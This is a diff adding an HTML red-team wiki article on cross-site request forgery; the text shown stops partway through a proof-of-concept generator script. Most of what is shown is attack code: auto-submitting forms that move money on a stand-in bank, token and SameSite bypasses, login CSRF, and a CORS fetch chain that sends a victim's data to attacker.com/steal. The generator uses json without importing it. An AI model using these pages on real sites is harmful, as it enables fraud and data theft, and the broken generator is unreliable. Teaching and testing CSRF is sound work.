@@ -1,0 +1,1064 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<title>CSRF | Cookie Engineer's Cyber Wiki</title>
+
+		<!-- Meta -->
+		<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=0.5, maximum-scale=2, user-scalable=yes">
+		<meta name="mobile-web-app-capable" content="yes">
+		<meta name="mobile-web-app-status-bar-style" content="black-translucent">
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="creator" content="Cookie Engineer">
+		<meta name="description" content="CSRF">
+		<meta name="keywords" content="cookies, cors, csrf, redteam, samesite, sop, token-bypass">
+		<meta name="generator" content="Cookie Engineer's bare hands with peppermint tea and nightly VIM coding sessions">
+		<meta name="robots" content="index, follow">
+
+		<!-- Social Media -->
+		<meta property="og:title" content="CSRF">
+		<meta property="og:site_name" content="Cookie Engineer's Wiki">
+		<meta property="og:description" content="Cross-Site Request Forgery - forcing authenticated users to perform unwanted actions through automatic cookie inclusion">
+		<meta property="og:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+		<meta property="og:url" content="https://cookie.engineer/wiki/articles/redteam/csrf.md">
+		<meta property="og:type" content="article">
+
+		<!-- Shitter -->
+		<meta name="twitter:card" content="summary">
+		<meta name="twitter:domain" content="cookie.engineer">
+		<meta name="twitter:title" itemprop="name" content="CSRF">
+		<meta name="twitter:description" itemprop="description" content="Cross-Site Request Forgery - forcing authenticated users to perform unwanted actions through automatic cookie inclusion">
+		<meta name="twitter:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+
+		<!-- Website Design -->
+		<link rel="stylesheet" href="/design/index.css">
+		<link rel="stylesheet" href="/design/highlight.css">
+		<script type="module" src="/design/index.mjs" defer></script>
+	</head>
+	<body data-layout="article">
+		<header>
+			<div><button data-action="toggle-aside" title="Toggle Sidebar" class="visible"></button><button data-action="toggle-theme" title="Switch Dark/Light Theme"></button><button data-action="toggle-font" title="Switch Dyslexic/Normal Fonts"></button><button data-action="open-website" title="Navigate to Website Index"></button><button data-action="open-wiki" title="Navigate to Wiki Index"></button></div>
+			<div><img src="/design/about/cookiengineer.png" width="32" height="32" /><h1><a href="/wiki/index.html">Cookie Engineer's Cyber Wiki</a></h1></div>
+			<div></div>
+		</header>
+
+		<div>
+		<aside class="visible">
+			<ul class="toc">
+				<li>
+					<b><a href="#overview">Overview</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#required-reading">Required Reading</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#how-csrf-works">How CSRF Works</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#session-cookie-mechanics">Session Cookie Mechanics</a></b>
+					<ul>
+						<li><a href="#httponly-does-not-block-csrf">HttpOnly Does Not Block CSRF</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#csrf-attack-construction">CSRF Attack Construction</a></b>
+					<ul>
+						<li><a href="#classic-form-based-csrf-get">Classic Form-Based CSRF (GET)</a></li>
+						<li><a href="#classic-form-based-csrf-post">Classic Form-Based CSRF (POST)</a></li>
+						<li><a href="#ajax-csrf-with-fetch">AJAX CSRF with fetch()</a></li>
+						<li><a href="#cors-preflight">CORS Preflight</a></li>
+						<li><a href="#preflight-bypass">Preflight Bypass</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#csrf-token-bypass-techniques">CSRF Token Bypass Techniques</a></b>
+					<ul>
+						<li><a href="#token-not-validated">Token Not Validated</a></li>
+						<li><a href="#testing-token-validation">Testing Token Validation</a></li>
+						<li><a href="#token-predictable">Token Predictable</a></li>
+						<li><a href="#exploiting-predictable-tokens">Exploiting Predictable Tokens</a></li>
+						<li><a href="#token-leaked-via-http-referer">Token Leaked via HTTP Referer</a></li>
+						<li><a href="#token-tied-to-session-not-action">Token Tied to Session, Not Action</a></li>
+						<li><a href="#token-stolen-via-xss-csrf-combined">Token Stolen via XSS + CSRF Combined</a></li>
+						<li><a href="#validation-skipped-on-get">Validation Skipped on GET</a></li>
+						<li><a href="#method-override-bypass">Method Override Bypass</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#samesite-cookie-bypass">SameSite Cookie Bypass</a></b>
+					<ul>
+						<li><a href="#samesitelax-bypass">SameSite=Lax Bypass</a></li>
+						<li><a href="#exploit">Exploit</a></li>
+						<li><a href="#redirect-bypass">Redirect Bypass</a></li>
+						<li><a href="#chaining-with-open-redirect">Chaining with Open Redirect</a></li>
+						<li><a href="#bypass-via-sibling-subdomain">Bypass via Sibling Subdomain</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#json-csrf">JSON CSRF</a></b>
+					<ul>
+						<li><a href="#json-csrf-with-fetch-no-cors-mode">JSON CSRF with fetch (no-cors mode)</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#login-csrf">Login CSRF</a></b>
+					<ul>
+						<li><a href="#login-csrf-impact">Login CSRF Impact</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#cors-misconfigurations">CORS Misconfigurations</a></b>
+					<ul>
+						<li><a href="#access-control-allow-origin-reflection">Access-Control-Allow-Origin Reflection</a></li>
+						<li><a href="#access-control-allow-origin-null">Access-Control-Allow-Origin: null</a></li>
+						<li><a href="#wildcard-origin-with-credentials">Wildcard Origin with Credentials</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#complete-csrf-poc-builder">Complete CSRF PoC Builder</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#csrf-chain-account-takeover">CSRF Chain: Account Takeover</a></b>
+					<ul>
+						<li><a href="#full-chain-poc">Full chain PoC</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#defenses">Defenses</a></b>
+					<ul>
+						<li><a href="#synchronizer-token-pattern">Synchronizer Token Pattern</a></li>
+						<li><a href="#samesite-cookies-best-defense">SameSite Cookies (Best Defense)</a></li>
+						<li><a href="#double-submit-cookie">Double Submit Cookie</a></li>
+						<li><a href="#custom-headers-preflight-check">Custom Headers & Preflight Check</a></li>
+						<li><a href="#origin-referer-validation">Origin / Referer Validation</a></li>
+						<li><a href="#origin-validation-weakness">Origin Validation Weakness</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#challenge">Challenge</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#references">References</a></b>
+					<ul>
+					</ul>
+				</li>
+			</ul>
+		</aside>
+
+			<main>
+				<nav aria-label="breadcrumbs">
+					<ol>
+						<li><a href="/wiki/index.html">Wiki</a></li>
+						<li><a href="/wiki/articles/redteam/index.html">Redteam</a></li>
+						<li aria-current="page"><a href="/wiki/articles/redteam/csrf.html">Csrf</a></li>
+					</ol>
+				</nav>
+
+				<article>
+					<h2 id="csrf">CSRF</h2>
+					<p>
+						Cross-Site Request Forgery - forcing authenticated users to perform unwanted actions through
+						automatic cookie inclusion.
+					</p>
+					<section>
+						<h3 id="overview">Overview</h3>
+						<p>
+							Cross-Site Request Forgery tricks an authenticated browser into sending a state-changing request
+							to a site where the victim holds a session cookie. This article explains why cookies travel
+							with cross-site requests, how to build GET and POST attack pages, how
+							<abbr title="Cross-Site Request Forgery">CSRF</abbr>
+							tokens fail in practice, and how SameSite cookies and token validation stop the attack.
+						</p>
+					</section>
+					<section>
+						<h3 id="required-reading">Required Reading</h3>
+						<ul>
+							<li><a href="/wiki/articles/fundamentals/http.html">HTTP</a> - methods, cookies, Same-Origin Policy, request construction</li>
+							<li><a href="/wiki/articles/fundamentals/authentication.html">Authentication</a> - session management, cookie attributes, token-based authentication</li>
+						</ul>
+					</section>
+					<section>
+						<h3 id="how-csrf-works">How CSRF Works</h3>
+						<p>
+							When a user logs into
+							<code>bank.com</code>
+							, the server sets a session cookie. For every subsequent request
+							to
+							<code>bank.com</code>
+							, the browser automatically attaches that cookie - regardless of which website
+							originated the request.
+						</p>
+						<pre class="plaintext">
+Victim visits attacker.com
+  → attacker.com sends a form/request to bank.com/transfer
+    → Browser attaches victim&#39;s bank.com cookies
+      → bank.com processes the transfer as if the victim initiated it
+						</pre>
+						<p>
+							The browser's Same-Origin Policy controls which origin a script can read data from (cross-origin
+							reads), but it does NOT prevent cross-origin writes. A form from
+							<code>attacker.com</code>
+							can POST to
+							<code>bank.com</code>
+							- and the browser will include
+							<code>bank.com</code>
+							's cookies.
+						</p>
+						<p>
+							This is not a browser bug. It's how the web was designed: cookies are "ambient authority" -
+							they travel with every request to their origin regardless of the initiating context.
+						</p>
+					</section>
+					<section>
+						<h3 id="session-cookie-mechanics">Session Cookie Mechanics</h3>
+						<p>Cookies have attributes that control their behavior:</p>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Attribute</th>
+									<th align="center">Effect on CSRF</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center"><code>Domain=.bank.com</code></td>
+									<td align="center">Cookie sent to bank.com and all subdomains</td>
+								</tr>
+								<tr>
+									<td align="center"><code>Path=/</code></td>
+									<td align="center">Cookie sent to all paths</td>
+								</tr>
+								<tr>
+									<td align="center"><code>Secure</code></td>
+									<td align="center">Cookie only sent over HTTPS</td>
+								</tr>
+								<tr>
+									<td align="center"><code>HttpOnly</code></td>
+									<td align="center">Cookie inaccessible to<code>document.cookie</code>(does NOT prevent CSRF)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>SameSite=Strict</code></td>
+									<td align="center">Cookie NOT sent on cross-site requests. Blocks CSRF.</td>
+								</tr>
+								<tr>
+									<td align="center"><code>SameSite=Lax</code></td>
+									<td align="center">Cookie sent on top-level GET navigations. Partial CSRF protection.</td>
+								</tr>
+								<tr>
+									<td align="center"><code>SameSite=None</code></td>
+									<td align="center">Cookie sent on all cross-site requests. No CSRF protection.</td>
+								</tr>
+							</tbody>
+						</table>
+						<h4 id="httponly-does-not-block-csrf">HttpOnly Does Not Block CSRF</h4>
+						<p>
+							<code>HttpOnly</code>
+							prevents JavaScript from reading the cookie but does NOT prevent the browser from
+							attaching it to requests.
+							<abbr title="Cross-Site Request Forgery">CSRF</abbr>
+							exploits the automatic attachment,
+							not cookie reading.
+						</p>
+					</section>
+					<section>
+						<h3 id="csrf-attack-construction">CSRF Attack Construction</h3>
+						<h4 id="classic-form-based-csrf-get">Classic Form-Based CSRF (GET)</h4>
+						<pre class="html">
+&lt;!-- attacker.com/csrf-attack.html --&gt;
+&lt;html&gt;
+&lt;body&gt;
+    &lt;h1&gt;Loading your free gift...&lt;/h1&gt;
+    &lt;!-- Victim&#39;s browser sends GET request with bank.com cookies --&gt;
+    &lt;img src=&#34;https://bank.com/transfer?to=attacker_account&amp;amount=10000&#34; style=&#34;display:none&#34;&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+						</pre>
+						<p>
+							When the victim visits this page, their browser makes a GET request to
+							<code>bank.com/transfer</code>
+							with
+							the victim's
+							<code>bank.com</code>
+							cookies. If the bank processes transfers via GET parameters, the transfer
+							executes.
+						</p>
+						<h4 id="classic-form-based-csrf-post">Classic Form-Based CSRF (POST)</h4>
+						<pre class="html">
+&lt;!-- attacker.com/csrf-post.html --&gt;
+&lt;html&gt;
+&lt;body&gt;
+    &lt;h1&gt;Claim Your Prize!&lt;/h1&gt;
+    &lt;form id=&#34;csrf-form&#34; action=&#34;https://bank.com/transfer&#34; method=&#34;POST&#34;&gt;
+        &lt;input type=&#34;hidden&#34; name=&#34;to&#34; value=&#34;attacker_account&#34;&gt;
+        &lt;input type=&#34;hidden&#34; name=&#34;amount&#34; value=&#34;10000&#34;&gt;
+    &lt;/form&gt;
+    &lt;script&gt;
+        // Auto-submit the form
+        document.getElementById(&#39;csrf-form&#39;).submit();
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+						</pre>
+						<h4 id="ajax-csrf-with-fetch">AJAX CSRF with fetch()</h4>
+						<pre class="html">
+&lt;html&gt;
+&lt;body&gt;
+&lt;script&gt;
+fetch(&#39;https://bank.com/transfer&#39;, {
+    method: &#39;POST&#39;,
+    credentials: &#39;include&#39;,      // Include cookies in cross-origin request
+    headers: {
+        &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;
+    },
+    body: &#39;to=attacker_account&amp;amount=10000&#39;
+});
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+						</pre>
+						<h4 id="cors-preflight">CORS Preflight</h4>
+						<p>
+							For cross-origin requests with
+							<code>Content-Type: application/json</code>
+							or custom headers, the browser
+							sends a preflight
+							<code>OPTIONS</code>
+							request. If the target server does not return appropriate CORS headers
+							(
+							<code>Access-Control-Allow-Origin</code>
+							,
+							<code>Access-Control-Allow-Credentials</code>
+							), the actual request is
+							blocked.
+						</p>
+						<h4 id="preflight-bypass">Preflight Bypass</h4>
+						<p>
+							Use
+							<code>Content-Type: application/x-www-form-urlencoded</code>
+							or
+							<code>text/plain</code>
+							- these are "simple requests"
+							that do NOT trigger a preflight. Or use
+							<code>mode: &#39;no-cors&#39;</code>
+							, which sends the request but makes
+							the response opaque (unreadable by JavaScript, but the action still executes server-side).
+						</p>
+					</section>
+					<section>
+						<h3 id="csrf-token-bypass-techniques">CSRF Token Bypass Techniques</h3>
+						<h4 id="token-not-validated">Token Not Validated</h4>
+						<p>
+							The server generates a
+							<abbr title="Cross-Site Request Forgery">CSRF</abbr>
+							token but never checks it on the backend.
+						</p>
+						<pre class="html">
+&lt;form action=&#34;/transfer&#34; method=&#34;POST&#34;&gt;
+    &lt;input type=&#34;hidden&#34; name=&#34;csrf&#34; value=&#34;any_value_works&#34;&gt;
+    ...
+&lt;/form&gt;
+						</pre>
+						<h4 id="testing-token-validation">Testing Token Validation</h4>
+						<p>
+							Remove the
+							<abbr title="Cross-Site Request Forgery">CSRF</abbr>
+							token from the request entirely. If it still works,
+							the token isn't validated.
+						</p>
+						<h4 id="token-predictable">Token Predictable</h4>
+						<p>
+							The
+							<abbr title="Cross-Site Request Forgery">CSRF</abbr>
+							token follows a known pattern.
+						</p>
+						<pre class="bash">
+# Observe token patterns
+Token: 1719453600_admin      # Unix timestamp + username
+Token: md5(session_id)        # Hash of session
+Token: base64(session_id)     # Base64 of session
+						</pre>
+						<h4 id="exploiting-predictable-tokens">Exploiting Predictable Tokens</h4>
+						<p>Generate the token yourself:</p>
+						<pre class="python">
+import hashlib
+import time
+import requests
+
+# If token = md5(session_id)
+session_id = requests.utils.dict_from_cookiejar(session.cookies).get(&#39;sessionid&#39;)
+csrf_token = hashlib.md5(session_id.encode()).hexdigest()
+
+# If token = timestamp
+csrf_token = str(int(time.time()))
+						</pre>
+						<h4 id="token-leaked-via-http-referer">Token Leaked via HTTP Referer</h4>
+						<p>
+							The
+							<abbr title="Cross-Site Request Forgery">CSRF</abbr>
+							token appears in the Referer header when navigating from
+							one page to another within the application. If the attacker can get the Referer, they get the
+							token.
+						</p>
+						<pre class="html">
+&lt;!-- On attacker-controlled page, use a link to leak the referer --&gt;
+&lt;a href=&#34;https://attacker.com/ref-steal&#34; referrerpolicy=&#34;unsafe-url&#34;&gt;
+    Click for free stuff
+&lt;/a&gt;
+						</pre>
+						<h4 id="token-tied-to-session-not-action">Token Tied to Session, Not Action</h4>
+						<p>
+							A single
+							<abbr title="Cross-Site Request Forgery">CSRF</abbr>
+							token is used for the entire session. The attacker
+							obtains it once and reuses it.
+						</p>
+						<pre class="javascript">
+// If account settings page has the token visible:
+fetch(&#39;https://bank.com/settings&#39;)
+  .then(r =&gt; r.text())
+  .then(html =&gt; {
+      let token = html.match(/name=&#34;csrf&#34; value=&#34;([^&#34;]+)&#34;/)[1];
+      // Now use this token for the transfer
+      fetch(&#39;https://bank.com/transfer&#39;, {
+          method: &#39;POST&#39;,
+          body: `to=attacker&amp;amount=10000&amp;csrf=${token}`,
+          credentials: &#39;include&#39;
+      });
+  });
+						</pre>
+						<p>
+							But this requires
+							<abbr title="Cross-Site Scripting">XSS</abbr>
+							or CORS misconfiguration. Which brings us to:
+						</p>
+						<h4 id="token-stolen-via-xss-csrf-combined">Token Stolen via XSS + CSRF Combined</h4>
+						<p>
+							<abbr title="Cross-Site Scripting">XSS</abbr>
+							on
+							<code>bank.com</code>
+							can read the
+							<abbr title="Cross-Site Request Forgery">CSRF</abbr>
+							token
+							from the
+							<abbr title="Document Object Model">DOM</abbr>
+							:
+						</p>
+						<pre class="javascript">
+var token = document.querySelector(&#39;meta[name=&#34;csrf-token&#34;]&#39;).content;
+fetch(&#39;/transfer&#39;, {
+    method: &#39;POST&#39;,
+    headers: { &#39;X-CSRF-Token&#39;: token },
+    body: &#39;to=attacker&amp;amount=10000&#39;,
+    credentials: &#39;include&#39;
+});
+						</pre>
+						<p>
+							<abbr title="Cross-Site Scripting">XSS</abbr>
+							bypasses all
+							<abbr title="Cross-Site Request Forgery">CSRF</abbr>
+							protections. This
+							is why
+							<abbr title="Cross-Site Scripting">XSS</abbr>
+							and
+							<abbr title="Cross-Site Request Forgery">CSRF</abbr>
+							are often chained.
+						</p>
+						<h4 id="validation-skipped-on-get">Validation Skipped on GET</h4>
+						<p>
+							Some applications skip
+							<abbr title="Cross-Site Request Forgery">CSRF</abbr>
+							validation for GET requests:
+						</p>
+						<pre class="bash">
+# POST requires token (blocked)
+curl -X POST &#39;https://bank.com/transfer&#39; -d &#39;to=attacker&amp;amount=10000&#39;
+# &#34;CSRF token missing&#34;
+
+# GET does not require token (vulnerable)
+curl &#39;https://bank.com/transfer?to=attacker&amp;amount=10000&#39;
+# &#34;Transfer complete&#34;
+						</pre>
+						<h4 id="method-override-bypass">Method Override Bypass</h4>
+						<p>
+							Some frameworks accept
+							<code>_method</code>
+							overrides:
+						</p>
+						<pre class="bash">
+# Application thinks this is POST, but browser sends as GET (no preflight)
+curl &#39;https://bank.com/transfer?_method=POST&amp;to=attacker&amp;amount=10000&#39;
+						</pre>
+					</section>
+					<section>
+						<h3 id="samesite-cookie-bypass">SameSite Cookie Bypass</h3>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">SameSite Value</th>
+									<th align="center">When Cookie Is Sent</th>
+									<th align="center">CSRF Protection</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center"><code>Strict</code></td>
+									<td align="center">Only same-site requests</td>
+									<td align="center">Full protection</td>
+								</tr>
+								<tr>
+									<td align="center"><code>Lax</code></td>
+									<td align="center">Same-site + top-level GET navigations</td>
+									<td align="center">Partial (GET CSRF possible)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>None</code></td>
+									<td align="center">All requests</td>
+									<td align="center">No protection</td>
+								</tr>
+								<tr>
+									<td align="center">Not set (Chrome default)</td>
+									<td align="center">Treated as Lax since Chrome 80</td>
+									<td align="center">Partial</td>
+								</tr>
+							</tbody>
+						</table>
+						<h4 id="samesitelax-bypass">SameSite=Lax Bypass</h4>
+						<p>Lax mode allows cookies on "top-level navigations with safe methods" (GET). This means:</p>
+						<pre class="plaintext">
+Victim clicks &lt;a href=&#34;https://bank.com/transfer?to=attacker&amp;amount=10000&#34;&gt;
+  → Browser sends bank.com cookies (top-level GET navigation)
+  → Transfer executes
+						</pre>
+						<h4 id="exploit">Exploit</h4>
+						<pre class="html">
+&lt;!-- Works with SameSite=Lax --&gt;
+&lt;a href=&#34;https://bank.com/transfer?to=attacker&amp;amount=10000&#34;&gt;
+    Click here to view a funny cat video
+&lt;/a&gt;
+						</pre>
+						<h4 id="redirect-bypass">Redirect Bypass</h4>
+						<p>If the app processes an action with GET and then redirects:</p>
+						<pre class="html">
+&lt;!-- attacker.com/lax-bypass.html --&gt;
+&lt;!-- Redirect immediately (same effect as clicking a link) --&gt;
+&lt;script&gt;location.href = &#39;https://bank.com/transfer?to=attacker&amp;amount=10000&#39;;&lt;/script&gt;
+						</pre>
+						<h4 id="chaining-with-open-redirect">Chaining with Open Redirect</h4>
+						<pre class="plaintext">
+https://bank.com/logout?redirect=https://bank.com/transfer?to=attacker&amp;amount=10000
+						</pre>
+						<p>
+							The victim starts on
+							<code>bank.com</code>
+							, the redirect keeps them on
+							<code>bank.com</code>
+							, SameSite=Lax sends
+							cookies throughout.
+						</p>
+						<h4 id="bypass-via-sibling-subdomain">Bypass via Sibling Subdomain</h4>
+						<p>
+							If the bank has a vulnerable subdomain (e.g.,
+							<code>blog.bank.com</code>
+							with
+							<abbr title="Cross-Site Scripting">XSS</abbr>
+							), and the session cookie has
+							<code>Domain=bank.com</code>
+							:
+						</p>
+						<pre class="javascript">
+// XSS on blog.bank.com — this is same-site to bank.com
+// SameSite=Lax sends cookies within the same site (same registrable domain)
+fetch(&#39;https://bank.com/transfer&#39;, {
+    method: &#39;POST&#39;,
+    credentials: &#39;include&#39;,
+    body: &#39;to=attacker&amp;amount=10000&#39;
+});
+						</pre>
+					</section>
+					<section>
+						<h3 id="json-csrf">JSON CSRF</h3>
+						<p>
+							<abbr title="Application Programming Interface">API</abbr>
+							s that accept
+							<abbr title="JavaScript Object Notation">JSON</abbr>
+							but
+							don't check Content-Type can be exploited:
+						</p>
+						<pre class="html">
+&lt;html&gt;
+&lt;body&gt;
+&lt;form id=&#34;csrf&#34; action=&#34;https://bank.com/api/transfer&#34; method=&#34;POST&#34;
+      enctype=&#34;text/plain&#34;&gt;
+    &lt;input type=&#34;hidden&#34; name=&#39;{&#34;to&#34;:&#34;attacker&#34;,&#34;amount&#34;:10000,&#34;csrf&#34;:&#34;ignored&#34;}&#39;
+           value=&#34;&#34;&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById(&#39;csrf&#39;).submit();&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+						</pre>
+						<p>The browser sends:</p>
+						<pre class="plaintext">
+Content-Type: text/plain
+
+{&#34;to&#34;:&#34;attacker&#34;,&#34;amount&#34;:10000,&#34;csrf&#34;:&#34;ignored&#34;}=
+						</pre>
+						<p>
+							The server sees
+							<code>text/plain</code>
+							, parses the body as
+							<abbr title="JavaScript Object Notation">JSON</abbr>
+							(because
+							the
+							<abbr title="Application Programming Interface">API</abbr>
+							always parses
+							<abbr title="JavaScript Object Notation">JSON</abbr>
+							), and processes it. The trailing
+							<code>=</code>
+							is often ignored by
+							<abbr title="JavaScript Object Notation">JSON</abbr>
+							parsers.
+						</p>
+						<h4 id="json-csrf-with-fetch-no-cors-mode">JSON CSRF with fetch (no-cors mode)</h4>
+						<pre class="javascript">
+fetch(&#39;https://bank.com/api/transfer&#39;, {
+    method: &#39;POST&#39;,
+    mode: &#39;no-cors&#39;,
+    headers: { &#39;Content-Type&#39;: &#39;text/plain&#39; },
+    body: JSON.stringify({ to: &#39;attacker&#39;, amount: 10000 })
+});
+						</pre>
+					</section>
+					<section>
+						<h3 id="login-csrf">Login CSRF</h3>
+						<p>The attacker forces the victim to log into the attacker's account:</p>
+						<pre class="html">
+&lt;form id=&#34;login-csrf&#34; action=&#34;https://bank.com/login&#34; method=&#34;POST&#34;&gt;
+    &lt;input type=&#34;hidden&#34; name=&#34;username&#34; value=&#34;attacker&#34;&gt;
+    &lt;input type=&#34;hidden&#34; name=&#34;password&#34; value=&#34;attacker_pass&#34;&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById(&#39;login-csrf&#39;).submit();&lt;/script&gt;
+						</pre>
+						<h4 id="login-csrf-impact">Login CSRF Impact</h4>
+						<p>
+							The victim is now logged into the attacker's account. If the victim performs actions (posts,
+							messages, search queries), those actions are attributed to the attacker. The attacker can later
+							view the victim's activity history.
+						</p>
+						<p>
+							On sites where the same browser is used for sensitive actions (search history, watched videos,
+							liked posts), login
+							<abbr title="Cross-Site Request Forgery">CSRF</abbr>
+							enables the attacker to extract the victim's
+							private data from the attacker's own activity log.
+						</p>
+					</section>
+					<section>
+						<h3 id="cors-misconfigurations">CORS Misconfigurations</h3>
+						<p>
+							CORS (Cross-Origin Resource Sharing) is the browser mechanism that allows controlled cross-origin
+							access. Misconfiguration turns
+							<abbr title="Cross-Site Request Forgery">CSRF</abbr>
+							into full cross-origin data
+							theft.
+						</p>
+						<h4 id="access-control-allow-origin-reflection">Access-Control-Allow-Origin Reflection</h4>
+						<pre class="http">
+# Server response:
+Access-Control-Allow-Origin: https://evil.com
+Access-Control-Allow-Credentials: true
+						</pre>
+						<p>
+							The server echoes back any
+							<code>Origin</code>
+							header. An attacker can make authenticated cross-origin
+							requests and read the response:
+						</p>
+						<pre class="javascript">
+// attacker.com
+fetch(&#39;https://bank.com/user-data&#39;, {
+    credentials: &#39;include&#39;
+}).then(r =&gt; r.json()).then(data =&gt; {
+    // Read victim&#39;s private data
+    fetch(&#39;https://attacker.com/steal&#39;, {
+        method: &#39;POST&#39;,
+        body: JSON.stringify(data)
+    });
+});
+						</pre>
+						<h4 id="access-control-allow-origin-null">Access-Control-Allow-Origin: null</h4>
+						<p>
+							Browser sends
+							<code>Origin: null</code>
+							for requests from sandboxed iframes,
+							<code>file://</code>
+							
+							<abbr title="Uniform Resource Identifier">URI</abbr>
+							s, and data
+							<abbr title="Uniform Resource Identifier">URI</abbr>
+							s. If the server allows
+							<code>null</code>
+							, an attacker
+							can use a sandboxed iframe:
+						</p>
+						<pre class="html">
+&lt;iframe sandbox=&#34;allow-scripts allow-top-navigation allow-forms&#34;
+        src=&#34;data:text/html,&lt;script&gt;
+fetch(&#39;https://bank.com/data&#39;, {credentials:&#39;include&#39;})
+  .then(r=&gt;r.text()).then(d=&gt;alert(d))
+&lt;/script&gt;&#34;&gt;
+&lt;/iframe&gt;
+						</pre>
+						<h4 id="wildcard-origin-with-credentials">Wildcard Origin with Credentials</h4>
+						<p>
+							<code>*</code>
+							with
+							<code>Access-Control-Allow-Credentials: true</code>
+							is invalid per spec, but some servers return
+							it. Browser behavior varies.
+						</p>
+					</section>
+					<section>
+						<h3 id="complete-csrf-poc-builder">Complete CSRF PoC Builder</h3>
+						<p>
+							A template for building
+							<abbr title="Cross-Site Request Forgery">CSRF</abbr>
+							Proof-of-Concept
+							<abbr title="Hypertext Markup Language">HTML</abbr>
+							files:
+						</p>
+						<pre class="python">
+#!/usr/bin/env python3
+&#34;&#34;&#34;CSRF PoC Generator — creates self-submitting HTML forms for CSRF attacks.&#34;&#34;&#34;
+
+import argparse
+import base64
+import urllib.parse
+
+def build_csrf_poc(url, method, params, auto_submit=True):
+    &#34;&#34;&#34;Build a complete CSRF PoC HTML page.&#34;&#34;&#34;
+    methods_available = {
+        &#39;get&#39;: &#39;GET&#39;,
+        &#39;post&#39;: &#39;POST&#39;,
+        &#39;post_json&#39;: &#39;POST (JSON)&#39;,
+        &#39;multipart&#39;: &#39;POST (multipart)&#39;
+    }
+
+    form_fields = &#39;&#39;
+    json_body = {}
+    for key, value in params.items():
+        if method in (&#39;post&#39;, &#39;multipart&#39;):
+            form_fields += f&#39;    &lt;input type=&#34;hidden&#34; name=&#34;{key}&#34; value=&#34;{value}&#34;&gt;\n&#39;
+        json_body[key] = value
+
+    auto_submit_js = &#39;&lt;script&gt;document.getElementById(&#34;csrf-form&#34;).submit();&lt;/script&gt;&#39; if auto_submit else &#39;&#39;
+
+    if method == &#39;post_json&#39;:
+        form_block = f&#39;&#39;&#39;
+    &lt;script&gt;
+    fetch(&#34;{url}&#34;, {{
+        method: &#34;POST&#34;,
+        credentials: &#34;include&#34;,
+        headers: {{ &#34;Content-Type&#34;: &#34;application/json&#34; }},
+        body: {json.dumps(json_body)}
+    }});
+    &lt;/script&gt;&#39;&#39;&#39;
+    elif method == &#39;multipart&#39;:
+        form_block = f&#39;&#39;&#39;
+    &lt;form id=&#34;csrf-form&#34; action=&#34;{url}&#34; method=&#34;POST&#34; enctype=&#34;text/plain&#34;&gt;
+{form_fields}    &lt;/form&gt;
+    {auto_submit_js}&#39;&#39;&#39;
+    else:
+        form_block = f&#39;&#39;&#39;
+    &lt;form id=&#34;csrf-form&#34; action=&#34;{url}&#34; method=&#34;{method.upper()}&#34;&gt;
+{form_fields}    &lt;/form&gt;
+    {auto_submit_js}&#39;&#39;&#39;
+
+    return f&#39;&#39;&#39;&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;CSRF Proof of Concept&lt;/title&gt;
+    &lt;style&gt;
+        body {{ font-family: monospace; max-width: 700px; margin: 40px auto;
+               padding: 20px; background: #111; color: #0f0; }}
+        pre {{ background: #222; padding: 15px; overflow-x: auto; }}
+        .poc {{ background: #1a1a1a; padding: 15px; border: 1px solid #0a0; margin: 10px 0; }}
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;CSRF Proof of Concept&lt;/h1&gt;
+    &lt;p&gt;Target: &lt;code&gt;{url}&lt;/code&gt;&lt;/p&gt;
+    &lt;p&gt;Method: &lt;code&gt;{method.upper()}&lt;/code&gt;&lt;/p&gt;
+    &lt;p&gt;Parameters:&lt;/p&gt;
+    &lt;pre&gt;{json.dumps(params, indent=2)}&lt;/pre&gt;
+
+    &lt;div class=&#34;poc&#34;&gt;
+        &lt;h2&gt;Live Attack (auto-submits)&lt;/h2&gt;
+{form_block}
+        &lt;p id=&#34;status&#34;&gt;Attack submitted. Check if action was performed.&lt;/p&gt;
+    &lt;/div&gt;
+
+    &lt;hr&gt;
+    &lt;h2&gt;Request that was sent&lt;/h2&gt;
+    &lt;pre&gt;{method.upper()} {url}
+{chr(10).join(f&#39;{k}={v}&#39; for k, v in params.items())}&lt;/pre&gt;
+
+    &lt;p&gt;&lt;small&gt;This page exploits CSRF in {urllib.parse.urlparse(url).netloc}.
+    For authorized security testing only.&lt;/small&gt;&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;&#39;&#39;&#39;
+
+def main():
